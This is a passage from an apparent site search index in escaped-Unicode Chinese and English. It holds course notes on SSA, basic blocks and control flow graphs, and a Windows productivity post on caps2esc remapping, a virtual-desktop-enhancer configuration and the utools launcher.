names(\u5728SSA\u4e2d\u7684\u6240\u6709\u8d4b\u503c\u90fd\u6307\u5411\u4e00\u4e2a\u65b0\u7684\u540d\u5b57)","title":"Static Single Assignment (SSA)"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#every-variable-has-exactly-one-definition\u6bcf\u4e2a\u53d8\u91cf\u90fd\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u786e\u5207\u7684\u5b9a\u4e49","text":"\u5f53\u6709\u6761\u4ef6\u8bed\u53e5\u65f6\u4f8b\u5916\uff0c\u9700\u8981\u5f15\u5165phi-function\u8fd9\u4e2a\u6807\u8bb0\u7528\u4e8e\u5408\u5e76\u591a\u4e2a\u8282\u70b9\u7684\u503c","title":"Every variable has exactly one definition(\u6bcf\u4e2a\u53d8\u91cf\u90fd\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u786e\u5207\u7684\u5b9a\u4e49?)"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#why-ssa","text":"Flow information is indirectly incorporated into the unique variable names(\u6d41\u4fe1\u606f\u95f4\u63a5\u5e76\u5165\u4e86\u72ec\u7acb\u7684\u53d8\u91cf\u540d\u4e2d) May help deliver some simpler analyses, e.g., flow-insensitive analysis gains partial precision of flow-sensitive analysis via SSA(\u53ef\u80fd\u53ef\u4ee5\u5e2e\u52a9\u7a0b\u5e8f\u66f4\u7b80\u5355\u5730\u8fdb\u884c\u5206\u6790\uff0c\uff0c\u6bd4\u5982\u901a\u8fc7SSA\uff0c\u6d41\u4fe1\u606f\u4e0d\u654f\u611f\u7684\u5206\u6790\u83b7\u5f97\u4e86\u6d41\u4fe1\u606f\u654f\u611f\u5206\u6790\u7684\u90e8\u5206\u7cbe\u5ea6) Define-and-Use pairs are explicit (\u5b9a\u4e49\u548c\u4f7f\u7528\u5bf9\u66f4\u52a0\u660e\u786e) Enable more effective data facts storage and propagation in some on-demand tasks (\u5728\u4e00\u4e9b\u6309\u9700\u4efb\u52a1\u4e2d\u5141\u8bb8\u66f4\u6709\u6548\u7684\u6570\u636e\u7684\u5b58\u50a8\u548c\u4f20\u64ad) Some optimization tasks perform better on SSA (e.g., conditional constant propagation, global value numbering) (\u4e00\u4e9b\u4f18\u5316\u9879\u76ee\u5728SSA\u4e0a\u5b8c\u6210\u5f97\u66f4\u597d)","title":"Why SSA"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#why-not-ssa","text":"SSA may introduce too many variables and phi-functions(SSA\u53ef\u80fd\u4f1a\u5f15\u5165\u592a\u591a\u7684\u53d8\u91cf\u548cphi-function) May introduce inefficiency problem when translating to machine code (due to copy operations) (\u53ef\u80fd\u4f1a\u5728\u7ffb\u8bd1\u6210\u673a\u5668\u7801\u65f6\u5bfc\u81f4\u6548\u7387\u4f4e\u4e0b\u7684\u95ee\u9898(\u7531\u4e8e\u590d\u5236\u64cd\u4f5c) )","title":"Why not SSA"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#basic-blocks-bb","text":"Basic blocks (BB) are maximal sequences of consecutive three-address instructions with the properties that: (\u57fa\u7840\u5757 (BB) \u662f\u4e09\u5730\u5740\u7801(3AC)\u7684\u8fde\u7eed\u6700\u5927\u5e8f\u5217\uff0c\u5b83\u5177\u6709\u4ee5\u4e0b\u7684\u6027\u8d28) - It can be entered only at the beginning, i.e., the first instruction in the block (\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u5165\u53e3\uff0c\u662f\u5757\u7684\u7b2c\u4e00\u4e2a3AC) - It can be exited only at the end, i.e., the last instruction in the block (\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u51fa\u53e3\uff0c\u662f\u5757\u7684\u6700\u540e\u4e00\u4e2aAC) \u5212\u5206Basic blocks\u7684\u5173\u952e\u662fgoto(\u8df3\u8f6c\u6307\u4ee4) \uff0c\u5177\u4f53\u5212\u5206\u65b9\u6cd5\u5982\u4e0b: 1. \u6211\u4eec\u628aBB\u4e2d\u7684\u7b2c\u4e00\u4e2a3AC\u79f0\u4e3aleader\uff0c\u5212\u5206BB\u8f6c\u4e3a\u5bfb\u627e\u6240\u6709\u7684leader 2. \u7b2c\u4e00\u4e2a3AC\u4e3aleader 3. \u5bfb\u627e\u6240\u6709goto\uff0c\u5176\u76ee\u68073AC\u5373\u4e3aleader 4. \u5bfb\u627e\u6240\u6709goto\uff0c\u5176\u4e0b\u4e00\u4e2a3AC\u4e5f\u662fleader 5. \u53bb\u91cd\u4e4b\u540e\u627e\u5230\u6240\u6709\u7684leader\uff0c\u4ece\u4e00\u4e2aleader\u5230\u4e0b\u4e00\u4e2aleader\u4e4b\u524d\u5373\u4e3a\u4e00\u4e2aBB","title":"Basic Blocks (BB)"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/#control-flow-graphs-cfg","text":"The nodes of CFG are basic blocks(CFG\u7684\u6700\u5c0f\u8282\u70b9\u662fBB) There is an edge from block A to block B if and only if(\u4ece\u5757A\u5230\u5757B\u7684\u8df3\u8f6c\u65b9\u5f0f\u53ea\u6709if) There is a conditional or unconditional jump from the end of A to the beginning of B(\u4ece\u5757A\u5230\u5757B\u7684\u8df3\u8f6c\u65b9\u5f0f\u53ea\u6709\u6709\u6761\u4ef6\u7684\u6216\u65e0\u6761\u4ef6\u7684jump) B immediately follows A in the original order of instructions and A does not end in an unconditional jump(\u5757B\u6309\u7167\u987a\u5e8f\u7d27\u8ddf\u5728\u5757A\u4e4b\u540e\u4e14A\u4e0d\u662f\u4ee5\u4e00\u4e2a\u65e0\u6761\u4ef6\u7684\u8df3\u8f6c\u4f5c\u4e3a\u7ed3\u5c3e) \u6211\u4eec\u79f0\u5757A\u4e3a\u5757B\u7684\u524d\u8d8b\uff0c\u5757B\u4e3a\u5757A\u7684\u540e\u7ee7 \u6700\u7ec8\u76ee\u7684: \u5c06\u4e00\u6bb53AC\u8f6c\u4e3aCFG","title":"Control Flow Graphs (CFG)"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/","text":"\u5173\u4e8ewindows\u63d0\u5347\u6548\u7387\u90a3\u4e9b\u4e8b # \u6700\u8fd1\u6362\u4e86\u65b0\u7535\u8111\uff0c\u914d\u7f6e\u7684\u65f6\u5019\u521a\u597d\u60f3\u8d77\u6765\uff0c\u4e8e\u662f\u603b\u7ed3\u4e0b\u5982\u4f55\u5728windows\u4e0b\u63d0\u9ad8\u6548\u7387\uff08\u4e3b\u8981\u662f\u5b9e\u73b0mac/*unix\u4e0b\u7684\u4e00\u4e9b\u5df2\u7ecf\u6709\u7684\u529f\u80fd\uff09 caps2esc # \u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 Caps Lock\u7684\u4f5c\u7528\u662f\u9501\u5b9a\u8f93\u5165\u4e3a\u5927\u5199\u5b57\u6bcd\uff0c\u8fd9\u4e2a\u952e\u4f4d\u5bf9\u6211\u6765\u8bf4\u6ca1\u4ec0\u4e48\u7528\uff0c\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528Shift\u4ee3\u66ff\u3002 \u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u5c06Caps Lock\u5229\u7528\u8d77\u6765\uff0c\u5728\u5355\u51fb\u548c\u957f\u6309\u65f6\u5206\u522b\u6620\u5c04\u4e3aEsc\u548cCtrl\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u51e0\u4e4e\u6ca1\u5fc5\u8981\u518d\u53bb\u6309ESC(\u5de6\u4e0a\u89d2)\u548cCtrl(\u5de6\u4e0b\u89d2)\u4e86\u3002 \u5b89\u88c5 # \u90a3\u4e48\u8981\u5982\u4f55\u5b9e\u73b0\u5462\uff1f\u7ed3\u5408\u524d\u4eba\u7684\u7ecf\u9a8c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u767d\u5ad6\uff0c\u94fe\u63a5\u5728 \u8fd9\u91cc \u76f4\u63a5\u4e0b\u8f7dInterception.zip\uff0c\u5728 command line installer \u6587\u4ef6\u5939\u548c samples/x86 \u6587\u4ef6\u5939\u4e0b\u627e\u5230\u6211\u4eec\u9700\u8981\u7684\u5de5\u5177\uff1a install-interception.exe \u548c caps2esc.exe \u6253\u5f00\u5177\u6709 \u7ba1\u7406\u5458\u6743\u9650 \u7684CMD\u6216POWERSHELL\u7a97\u53e3\uff0c\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801: .\\install-interception.exe /install \u6b64\u65f6\u518d\u8fd0\u884c caps2esc.exe \u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u6548\u679c\u4e86\uff08\u5982\u679c\u6ca1\u6548\u679c\u8bd5\u8bd5\u91cd\u542f\u5927\u6cd5\uff0c\u5426\u5219\u5c31\u662f\u4e0a\u9762\u7684install\u6ca1\u6709\u6210\u529f\uff09 \u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\uff0c\u53ef\u4ee5\u5c06 caps2esc.exe \u8bbe\u7f6e\u4e3a\u5f00\u673a\u542f\u52a8 \u5982\u679c\u8981\u5378\u8f7d\u7684\u8bdd\uff0c\u5219\u6267\u884c .\\install-interception.exe /uninstall \u5373\u53ef\u3002 \u4f7f\u7528 # \u5c31\u5982\u6211\u4eec\u521a\u521a\u6240\u8bf4\uff0c\u6b64\u65f6Caps Lock\u952e\u5355\u51fb\u65f6\u4f1a\u53d8\u6210esc\u952e\uff08\u4ee5\u524d\u6211\u4e0d\u559c\u6b22\u6309esc\u952e\uff0c\u56e0\u4e3a\u5b83\u5b9e\u5728\u592a\u8fdc\u4e86\uff0c\u4f46\u662f\u73b0\u5728\u8d8a\u6309\u8d8a\u723d\uff09\uff0c\u914d\u5408\u5176\u4ed6\u6309\u952e\u4e00\u8d77\u7684\u65f6\u5019\u5c31\u662fCtrl\u952e\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f60\u53ef\u4ee5\u4f7f\u7528Caps Lock + c\u4f5c\u4e3aCtrl + c\u7b49\uff0c\u540c\u65f6\u539f\u672c\u7684ESC\u952e\u5219\u53d8\u4e3a\u4e86\u539f\u59cbCaps Lock\u7684\u529f\u80fd virtual-desktop-enhancer # \u6211\u4eec\u77e5\u9053windows10\u4e2d\u662f\u5b58\u5728\u591a\u865a\u62df\u684c\u9762\u7684\uff0c\u4f46\u662f\u4e00\u76f4\u4e0d\u591f\u597d\u7528\uff08\u4e0d\u80fd\u901a\u8fc7\u952e\u76d8\u5207\u6362\u5230\u6307\u5b9a\u7684\u684c\u9762\uff0c\u4e0d\u80fd\u901a\u8fc7\u952e\u76d8\u5c06\u67d0\u4e2a\u8fdb\u7a0b\u79fb\u52a8\u5230\u67d0\u4e2a\u6307\u5b9a\u7684\u684c\u9762\uff09\uff0c\u800cvirtual-desktop-enhancer\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684 \u5b89\u88c5 # virtual-desktop-enhancer\u5728github\u4e0a\u5c31\u80fd\u641c\u5230\uff0c\u4f46\u662f\u65e9\u5c31\u5f52\u6863\u4e0d\u66f4\u65b0\u4e86\uff0c\u8fd9\u5c31\u5bfc\u81f4\u65b0\u7248windows\u65e0\u6cd5\u4f7f\u7528\uff0c\u6b64\u65f6\u5c31\u8981\u53bb\u627e\u5b83\u7684fork\u9879\u76ee\uff0c\u627e\u5230\u8fd8\u80fd\u65b0\u7248windows\u7528\u7684(windows \u7248\u672c21h1\u53ef\u4ee5\u4f7f\u7528)\uff0c\u94fe\u63a5\u5728 \u8fd9\u91cc \u5b89\u88c5\u76f4\u63a5 git clone https://github.com/amrahm/win-10-virtual-desktop-enhancer \u5373\u53ef \u4f7f\u7528 # \u4f7f\u7528windows+tab\u53bb\u521b\u5efa\u51e0\u4e2a\u65b0\u7684\u865a\u62df\u684c\u9762(\u597d\u50cf\u53ef\u4ee5\u7701\u7565) \u53ef\u4ee5\u5b89\u88c5autohotkey\u53bb\u8fd0\u884c.ahk\u811a\u672c\u6216\u8005\u76f4\u63a5\u8fd0\u884cexe\uff0c\u76f8\u5173\u914d\u7f6e\u5728 settings.ini \u770b\u770b\u53f3\u4e0b\u89d2\u4efb\u52a1\u680f\u662f\u5426\u5f00\u4e86\u4e2a\u65b0\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u662f\u4e00\u4e2a\u6570\u5b57\uff08\u5bf9\u5e94\u5f53\u524d\u7684\u684c\u9762\uff09 \u4fee\u6539\u914d\u7f6e\uff0c\u8fd9\u91cc\u8d34\u4e0b\u6211\u7684\u914d\u7f6e,\u4f7f\u7528windows+\u6570\u5b57\u952e\u5207\u6362\u5230\u5bf9\u5e94\u7684\u865a\u62df\u684c\u9762\uff0c\u4f7f\u7528windows+shift+\u6570\u5b57\u952e\u5c06\u5f53\u524d\u7684\u8fdb\u7a0b\u79fb\u52a8\u5230\u5bf9\u5e94\u7684\u865a\u62df\u684c\u9762\uff0c\u540c\u65f6\u53ef\u4ee5\u4fee\u6539[Wallpapers]\u4e2d\u7684\u8def\u5f84\uff0c\u4ece\u800c\u4f7f\u5f97\u4e0d\u540c\u7684\u865a\u62df\u684c\u9762\u81ea\u52a8\u5207\u6362\u4e0d\u540c\u7684\u684c\u9762\u80cc\u666f [General] DefaultDesktop = 2 TaskbarScrollSwitching = 0 UseNativePrevNextDesktopSwitchingIfConflicting = 0 DesktopWrapping = 1 [Tooltips] Enabled = 1 ; One of LEFT, CENTER, RIGHT PositionX = CENTER ; One of TOP, CENTER, BOTTOM PositionY = CENTER FontSize = 11 FontColor = 0xFFFFFF FontInBold = 1 BackgroundColor = 0x1F1F1F Lifespan = 750 ; Watch out! Long durations (> 500ms) could cause troubles as the program freezes during the animation. FadeOutAnimationDuration = 100 OnEveryMonitor = 1 [KeyboardShortcutsCombinations] TogglePinWindow = Win, Ctrl, Shift, Q TogglePinApp = Win, Ctrl, Shift, A PinWindow = PinApp = UnpinWindow = UnpinApp = ; \"SC029\" is the key below your \"Esc\" key OpenDesktopManager = ChangeDesktopName = Win, F2 [KeyboardShortcutsModifiers] SwitchDesktop = Win MoveWindowToDesktop = Win, Shift MoveWindowAndSwitchToDesktop = Win, Shift, Alt NextTenDesktops = [KeyboardShortcutsIdentifiers] PreviousDesktop = , NextDesktop = . Desktop1 = 1 Desktop2 = 2 Desktop3 = 3 Desktop4 = 4 Desktop5 = 5 Desktop6 = 6 Desktop7 = 7 Desktop8 = 8 Desktop9 = 9 Desktop10 = 0 DesktopAlt1 = Numpad1 DesktopAlt2 = Numpad2 DesktopAlt3 = Numpad3 DesktopAlt4 = Numpad4 DesktopAlt5 = Numpad5 DesktopAlt6 = Numpad6 DesktopAlt7 = Numpad7 DesktopAlt8 = Numpad8 DesktopAlt9 = Numpad9 DesktopAlt10 = Numpad0 [Wallpapers] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = [DesktopNames] 1 = code 2 = view 3 = work 4 = play 5 = other 6 = 7 = 8 = 9 = 10 = [RunProgramWhenSwitchingToDesktop] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = [RunProgramWhenSwitchingFromDesktop] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = \u6109\u5feb\u5730\u4eab\u53d7 utools # \u8fd9\u4e2a\u5de5\u5177\u662f\u5feb\u901f\u542f\u52a8\u5de5\u5177\uff0c\u540c\u7c7b\u8f6f\u4ef6\u6709wox\uff0cAlfred\u7b49\uff0c\u6700\u7ec8\u9009\u62e9utools\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u8fd9\u4e2a\u5de5\u5177\u4e0b\u6709\u4e2a\u795e\u7ea7\u63d2\u4ef6\uff1a \u5feb\u6377\u547d\u4ee4 \u5b89\u88c5 # \u76f4\u63a5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u5b89\u88c5\u5373\u53ef \u4f7f\u7528\u6280\u5de7 # \u4fee\u6539\u542f\u52a8\u5feb\u6377\u952e\uff0c\u6211\u4e2a\u4eba\u662f\u559c\u6b22\u8bbe\u7f6e\u4e3aAlt+`\u8fd9\u4e2a\u952e\u4f4d \u5b89\u88c5 \u5feb\u6377\u547d\u4ee4 \u8fd9\u4e2a\u63d2\u4ef6\uff0c\u7136\u540e\u5c31\u80fd\u6109\u5feb\u5730\u53bb\u5b9e\u73b0\u8bb8\u591a\u529f\u80fd\uff0c\u4f8b\u5982\u642d\u914d\u6211\u7f16\u5199\u7684 \u5de5\u5177 \u5feb\u901f\u6839\u636e\u6a21\u677f\u751f\u6210payload\uff0c\u5e76\u4e14\u4f1a\u81ea\u52a8\u590d\u5236\u5230\u526a\u5207\u677f\u91cc\uff0c\u4f8b\u5982\u53cd\u5f39shell\u7684payload,\u4f8b\u5982\uff1a \u66f4\u591a\u7684\u529f\u80fd\u53ef\u4ee5\u81ea\u5df1\u53bb\u7814\u7a76\uff08 \u8bbe\u7f6e\u5168\u5c40\u5feb\u6377\u952e\uff0c\u4f8b\u5982\u6211\u8bbe\u7f6eCtrl + Alt + T\u5feb\u901f\u6253\u5f00windows terminal\uff0cCtrl + Alt + B\u5feb\u901f\u6253\u5f00Burpsuite \u8d85\u7ea7\u9762\u677f\uff0c\u770b\u7740\u7528\uff0c\u6709\u65f6\u5019\u8fd8\u633a\u65b9\u4fbf\u7684\uff0c\u6bd4\u5982\u6211\u5199\u4e86\u4e2a\u5feb\u6377\u547d\u4ee4\uff0c\u5c06\u9009\u4e2d\u7684\u6587\u4ef6\u5feb\u901f\u4e22\u5230wsl\u91cc","title":"\u5173\u4e8ewindows\u63d0\u5347\u6548\u7387\u90a3\u4e9b\u4e8b"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u5173\u4e8ewindows\u63d0\u5347\u6548\u7387\u90a3\u4e9b\u4e8b","text":"\u6700\u8fd1\u6362\u4e86\u65b0\u7535\u8111\uff0c\u914d\u7f6e\u7684\u65f6\u5019\u521a\u597d\u60f3\u8d77\u6765\uff0c\u4e8e\u662f\u603b\u7ed3\u4e0b\u5982\u4f55\u5728windows\u4e0b\u63d0\u9ad8\u6548\u7387\uff08\u4e3b\u8981\u662f\u5b9e\u73b0mac/*unix\u4e0b\u7684\u4e00\u4e9b\u5df2\u7ecf\u6709\u7684\u529f\u80fd\uff09","title":"\u5173\u4e8ewindows\u63d0\u5347\u6548\u7387\u90a3\u4e9b\u4e8b"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#caps2esc","text":"\u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 Caps Lock\u7684\u4f5c\u7528\u662f\u9501\u5b9a\u8f93\u5165\u4e3a\u5927\u5199\u5b57\u6bcd\uff0c\u8fd9\u4e2a\u952e\u4f4d\u5bf9\u6211\u6765\u8bf4\u6ca1\u4ec0\u4e48\u7528\uff0c\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528Shift\u4ee3\u66ff\u3002 \u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u5c06Caps Lock\u5229\u7528\u8d77\u6765\uff0c\u5728\u5355\u51fb\u548c\u957f\u6309\u65f6\u5206\u522b\u6620\u5c04\u4e3aEsc\u548cCtrl\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u51e0\u4e4e\u6ca1\u5fc5\u8981\u518d\u53bb\u6309ESC(\u5de6\u4e0a\u89d2)\u548cCtrl(\u5de6\u4e0b\u89d2)\u4e86\u3002","title":"caps2esc"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u5b89\u88c5","text":"\u90a3\u4e48\u8981\u5982\u4f55\u5b9e\u73b0\u5462\uff1f\u7ed3\u5408\u524d\u4eba\u7684\u7ecf\u9a8c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u767d\u5ad6\uff0c\u94fe\u63a5\u5728 \u8fd9\u91cc \u76f4\u63a5\u4e0b\u8f7dInterception.zip\uff0c\u5728 command line installer \u6587\u4ef6\u5939\u548c samples/x86 \u6587\u4ef6\u5939\u4e0b\u627e\u5230\u6211\u4eec\u9700\u8981\u7684\u5de5\u5177\uff1a install-interception.exe \u548c caps2esc.exe \u6253\u5f00\u5177\u6709 \u7ba1\u7406\u5458\u6743\u9650 \u7684CMD\u6216POWERSHELL\u7a97\u53e3\uff0c\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801: .\\install-interception.exe /install \u6b64\u65f6\u518d\u8fd0\u884c caps2esc.exe \u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u6548\u679c\u4e86\uff08\u5982\u679c\u6ca1\u6548\u679c\u8bd5\u8bd5\u91cd\u542f\u5927\u6cd5\uff0c\u5426\u5219\u5c31\u662f\u4e0a\u9762\u7684install\u6ca1\u6709\u6210\u529f\uff09 \u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\uff0c\u53ef\u4ee5\u5c06 caps2esc.exe \u8bbe\u7f6e\u4e3a\u5f00\u673a\u542f\u52a8 \u5982\u679c\u8981\u5378\u8f7d\u7684\u8bdd\uff0c\u5219\u6267\u884c .\\install-interception.exe /uninstall \u5373\u53ef\u3002","title":"\u5b89\u88c5"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u4f7f\u7528","text":"\u5c31\u5982\u6211\u4eec\u521a\u521a\u6240\u8bf4\uff0c\u6b64\u65f6Caps Lock\u952e\u5355\u51fb\u65f6\u4f1a\u53d8\u6210esc\u952e\uff08\u4ee5\u524d\u6211\u4e0d\u559c\u6b22\u6309esc\u952e\uff0c\u56e0\u4e3a\u5b83\u5b9e\u5728\u592a\u8fdc\u4e86\uff0c\u4f46\u662f\u73b0\u5728\u8d8a\u6309\u8d8a\u723d\uff09\uff0c\u914d\u5408\u5176\u4ed6\u6309\u952e\u4e00\u8d77\u7684\u65f6\u5019\u5c31\u662fCtrl\u952e\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f60\u53ef\u4ee5\u4f7f\u7528Caps Lock + c\u4f5c\u4e3aCtrl + c\u7b49\uff0c\u540c\u65f6\u539f\u672c\u7684ESC\u952e\u5219\u53d8\u4e3a\u4e86\u539f\u59cbCaps Lock\u7684\u529f\u80fd","title":"\u4f7f\u7528"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#virtual-desktop-enhancer","text":"\u6211\u4eec\u77e5\u9053windows10\u4e2d\u662f\u5b58\u5728\u591a\u865a\u62df\u684c\u9762\u7684\uff0c\u4f46\u662f\u4e00\u76f4\u4e0d\u591f\u597d\u7528\uff08\u4e0d\u80fd\u901a\u8fc7\u952e\u76d8\u5207\u6362\u5230\u6307\u5b9a\u7684\u684c\u9762\uff0c\u4e0d\u80fd\u901a\u8fc7\u952e\u76d8\u5c06\u67d0\u4e2a\u8fdb\u7a0b\u79fb\u52a8\u5230\u67d0\u4e2a\u6307\u5b9a\u7684\u684c\u9762\uff09\uff0c\u800cvirtual-desktop-enhancer\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684","title":"virtual-desktop-enhancer"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u5b89\u88c5_1","text":"virtual-desktop-enhancer\u5728github\u4e0a\u5c31\u80fd\u641c\u5230\uff0c\u4f46\u662f\u65e9\u5c31\u5f52\u6863\u4e0d\u66f4\u65b0\u4e86\uff0c\u8fd9\u5c31\u5bfc\u81f4\u65b0\u7248windows\u65e0\u6cd5\u4f7f\u7528\uff0c\u6b64\u65f6\u5c31\u8981\u53bb\u627e\u5b83\u7684fork\u9879\u76ee\uff0c\u627e\u5230\u8fd8\u80fd\u65b0\u7248windows\u7528\u7684(windows \u7248\u672c21h1\u53ef\u4ee5\u4f7f\u7528)\uff0c\u94fe\u63a5\u5728 \u8fd9\u91cc \u5b89\u88c5\u76f4\u63a5 git clone https://github.com/amrahm/win-10-virtual-desktop-enhancer \u5373\u53ef","title":"\u5b89\u88c5"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u4f7f\u7528_1","text":"\u4f7f\u7528windows+tab\u53bb\u521b\u5efa\u51e0\u4e2a\u65b0\u7684\u865a\u62df\u684c\u9762(\u597d\u50cf\u53ef\u4ee5\u7701\u7565) \u53ef\u4ee5\u5b89\u88c5autohotkey\u53bb\u8fd0\u884c.ahk\u811a\u672c\u6216\u8005\u76f4\u63a5\u8fd0\u884cexe\uff0c\u76f8\u5173\u914d\u7f6e\u5728 settings.ini \u770b\u770b\u53f3\u4e0b\u89d2\u4efb\u52a1\u680f\u662f\u5426\u5f00\u4e86\u4e2a\u65b0\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u662f\u4e00\u4e2a\u6570\u5b57\uff08\u5bf9\u5e94\u5f53\u524d\u7684\u684c\u9762\uff09 \u4fee\u6539\u914d\u7f6e\uff0c\u8fd9\u91cc\u8d34\u4e0b\u6211\u7684\u914d\u7f6e,\u4f7f\u7528windows+\u6570\u5b57\u952e\u5207\u6362\u5230\u5bf9\u5e94\u7684\u865a\u62df\u684c\u9762\uff0c\u4f7f\u7528windows+shift+\u6570\u5b57\u952e\u5c06\u5f53\u524d\u7684\u8fdb\u7a0b\u79fb\u52a8\u5230\u5bf9\u5e94\u7684\u865a\u62df\u684c\u9762\uff0c\u540c\u65f6\u53ef\u4ee5\u4fee\u6539[Wallpapers]\u4e2d\u7684\u8def\u5f84\uff0c\u4ece\u800c\u4f7f\u5f97\u4e0d\u540c\u7684\u865a\u62df\u684c\u9762\u81ea\u52a8\u5207\u6362\u4e0d\u540c\u7684\u684c\u9762\u80cc\u666f [General] DefaultDesktop = 2 TaskbarScrollSwitching = 0 UseNativePrevNextDesktopSwitchingIfConflicting = 0 DesktopWrapping = 1 [Tooltips] Enabled = 1 ; One of LEFT, CENTER, RIGHT PositionX = CENTER ; One of TOP, CENTER, BOTTOM PositionY = CENTER FontSize = 11 FontColor = 0xFFFFFF FontInBold = 1 BackgroundColor = 0x1F1F1F Lifespan = 750 ; Watch out! Long durations (> 500ms) could cause troubles as the program freezes during the animation. FadeOutAnimationDuration = 100 OnEveryMonitor = 1 [KeyboardShortcutsCombinations] TogglePinWindow = Win, Ctrl, Shift, Q TogglePinApp = Win, Ctrl, Shift, A PinWindow = PinApp = UnpinWindow = UnpinApp = ; \"SC029\" is the key below your \"Esc\" key OpenDesktopManager = ChangeDesktopName = Win, F2 [KeyboardShortcutsModifiers] SwitchDesktop = Win MoveWindowToDesktop = Win, Shift MoveWindowAndSwitchToDesktop = Win, Shift, Alt NextTenDesktops = [KeyboardShortcutsIdentifiers] PreviousDesktop = , NextDesktop = . Desktop1 = 1 Desktop2 = 2 Desktop3 = 3 Desktop4 = 4 Desktop5 = 5 Desktop6 = 6 Desktop7 = 7 Desktop8 = 8 Desktop9 = 9 Desktop10 = 0 DesktopAlt1 = Numpad1 DesktopAlt2 = Numpad2 DesktopAlt3 = Numpad3 DesktopAlt4 = Numpad4 DesktopAlt5 = Numpad5 DesktopAlt6 = Numpad6 DesktopAlt7 = Numpad7 DesktopAlt8 = Numpad8 DesktopAlt9 = Numpad9 DesktopAlt10 = Numpad0 [Wallpapers] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = [DesktopNames] 1 = code 2 = view 3 = work 4 = play 5 = other 6 = 7 = 8 = 9 = 10 = [RunProgramWhenSwitchingToDesktop] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = [RunProgramWhenSwitchingFromDesktop] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = 